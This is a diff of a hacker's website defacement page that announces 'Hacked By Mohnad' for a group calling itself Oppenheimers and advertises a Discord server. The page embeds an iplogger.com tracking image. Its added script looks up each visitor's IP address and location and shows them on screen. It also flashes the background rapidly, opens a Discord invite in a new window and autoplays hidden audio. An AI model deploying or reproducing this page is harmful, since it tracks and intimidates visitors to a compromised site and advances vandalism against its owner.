@@ -5,6 +5,8 @@
 </head>
 <body bgcolor="#000000">
 <script>
+ 
+
     var names = ["Pwn506", "Sylx", "FA7", "Russia", "PRD8A", "Dingo"];
     var nameIndex = 0;
 
@@ -22,7 +24,7 @@
     <img border="0" src="https://iplogger.com/29jWm4.png" width="750" height="500">
 </p>
 <p align="center">
-    <font face="Courier" size="6" style="color: #666666;"><span id="hacked-name">Hacked By pwn</span></font>
+    <font face="Courier" size="6" style="color: #666666;"><span id="hacked-name">Hacked By Mohnad</span></font>
 </p>
 <p align="center">
     <font face="Courier" size="4"><b>
@@ -33,7 +35,7 @@
 </p>
 <p align="center">
     <b>
-        <font face="Courier" size="4" color="red">Hello kid &lt;3 Who we Are  <span id="name">Oppenheimers</span></font>
+        <font face="Courier" size="4" color="red">Hello kiddo &lt;3 Who we Are  <span id="name">Oppenheimers</span></font>
     </b>
 </p>
 <p align="center">
@@ -41,11 +43,102 @@
         <font face="Courier" size="4" color="#666666">Discord : https://discord.gg/PWN</font>
     </b>
 </p>
-
-<!-- Add the audio element for the sound with autoplay -->
-<audio controls autoplay>
-    <source src="https://cdn.discordapp.com/attachments/1160881380536881203/1171604398821085256/9a72e4d7-f72c-4f09-a023-7f8b2cd84795.wav?ex=655d48a0&is=654ad3a0&hm=2f2c7057b12fc367a320421d3cdb32dc2d29c53809c39e723f9a37358963b3a3&" type="audio/mpeg">
-    Your browser does not support the audio element.
-</audio>
+<p align="center">
+</p>
 </body>
 </html>
+
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            text-align: center;
+            color: black;
+        }
+
+        h1 {
+            color: black;
+        }
+
+        h3 {
+            color: black;
+        }
+
+        #ip-address {
+            display: inline;
+        }
+
+        #ip-address-label {
+            color: black;
+        }
+
+        #ip-address-value {
+            color: red;
+        }
+
+        #ip-info {
+            font-family: monospace;
+            white-space: pre;
+            color: red;
+        }
+    </style>
+    <script>
+        // JavaScript code to fetch and display the user's IP address and information
+        function fetchIPAndInfo() {
+            fetch('https://api.ipify.org/?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('ip-address-value').textContent = data.ip;
+                    return data.ip;
+                })
+                .then(ip => fetch(`https://ipinfo.io/${ip}/json`))
+                .then(response => response.json())
+                .then(ipInfoData => {
+                    document.getElementById('ip-info').textContent = JSON.stringify(ipInfoData, null, 2);
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                    document.getElementById('ip-address-value').textContent = 'Unable to fetch IP address.';
+                    document.getElementById('ip-info').textContent = 'Unable to fetch IP information.';
+                });
+        }
+
+        // Function to toggle the background color between white and black
+        function toggleBackgroundColor() {
+            var body = document.getElementsByTagName('body')[0];
+            var currentColor = body.style.backgroundColor;
+            var newColor = currentColor === 'white' ? 'black' : 'white';
+            body.style.backgroundColor = newColor;
+        }
+
+        // Fetch IP address and information initially
+        fetchIPAndInfo();
+
+        // Toggle background color every second
+        setInterval(toggleBackgroundColor, 500);
+        window.open('https://discord.gg/pwn','_blank');
+    </script>
+</head>
+<body>
+    <h3 style="color: grey;">Your IP Address:</h3>
+    <p id="ip-address">
+        <span id="ip-address-label">Your IP Address: </span>
+        <span id="ip-address-value">Loading...</span>
+    </p>
+
+    <h3 style="color: grey;">Your IP Information:</h3>
+    <pre id="ip-info">Fetching...</pre>
+    
+    
+  <video width="0" height="0" controls autoplay loop>
+  <source src="https://cdn.discordapp.com/attachments/1157677551234318509/1171654870080696414/Oppwn-1.mp3?ex=655d77a1&is=654b02a1&hm=451a8f665160465050aa7f580b8015503132ccbbbedd0b9c9220fb121c86d1c1&" type="audio/mp3">
+</video>
+
+
+        
+</body>
+</html>
+</html>
+</body></html>
